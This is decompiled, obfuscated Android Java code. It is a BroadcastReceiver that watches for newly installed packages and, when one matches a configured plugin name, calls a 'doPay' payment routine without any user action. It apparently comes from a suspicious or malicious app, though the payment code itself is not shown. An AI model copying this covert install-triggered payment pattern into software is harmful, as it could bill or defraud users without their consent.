package com.sfyvctwaqbjhki.uwmpqfh.epbnq;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.sfyvctwaqbjhki.uwmpqfh.WoUjMp;
import com.sfyvctwaqbjhki.uwmpqfh.biohepbeans.EDakAXiM;
import com.sfyvctwaqbjhki.uwmpqfh.mcluykfz.Response;
import com.sfyvctwaqbjhki.uwmpqfh.ovlfuarnk.PluginNXUfldNktBOT;

/* loaded from: classes.dex */
public class IghKACSecQpXL extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.intent.action.PACKAGE_ADDED")) {
            String schemeSpecificPart = intent.getData() != null ? intent.getData().getSchemeSpecificPart() : "";
            Log.e("yy", "app installed --" + schemeSpecificPart);
            EDakAXiM eDakAXiM = Response.getInstance().getEDakAXiM();
            if (eDakAXiM != null && schemeSpecificPart.equals(eDakAXiM.getPublics().getGpPluginGpUrl()) && PluginNXUfldNktBOT.getInstance().isDoPay()) {
                PluginNXUfldNktBOT.getInstance().doPay(WoUjMp.getInstance().getContext());
            }
        }
    }
}
